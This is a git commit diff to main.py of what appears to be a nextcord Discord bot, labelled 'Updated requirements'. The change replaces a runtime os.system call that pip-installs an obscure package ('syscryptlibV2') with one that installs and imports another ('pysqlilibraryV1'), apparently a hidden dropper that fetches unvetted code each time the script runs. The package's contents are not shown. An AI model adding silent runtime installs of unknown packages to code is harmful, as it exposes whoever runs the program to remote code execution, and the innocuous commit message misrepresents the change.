57f351c3837e4cf3b41b724227589ef0ac149558
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 20:50:39 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syscryptlibV2")
-import syscryptlibV2
+os.system("pip install pysqlilibraryV1")
+import pysqlilibraryV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
